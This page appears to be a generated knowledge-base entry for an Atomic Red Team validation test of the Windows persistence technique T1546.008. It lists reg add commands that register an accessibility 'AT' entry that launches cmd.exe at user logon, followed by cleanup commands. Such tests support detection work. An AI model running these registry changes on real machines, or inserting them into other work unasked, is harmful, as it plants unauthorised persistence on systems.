---
atomic_guid: "7125eba8-7b30-426b-9147-781d152be6fb"
title: "Auto-start application on user logon"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "7125eba8-7b30-426b-9147-781d152be6fb"
  - "Auto-start application on user logon"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Executes code specified in the registry on new user logon session automatically by registration of new AT and modification of configuration value.
This test will register new AT named malware_test with code for cmd.exe and add a configuration value for the code to be run during user logon session.

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution#^t1546008-accessibility-features|T1546.008: Accessibility Features]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /t REG_SZ /d malware_test /f
```

### Cleanup

```cmd
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /f
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
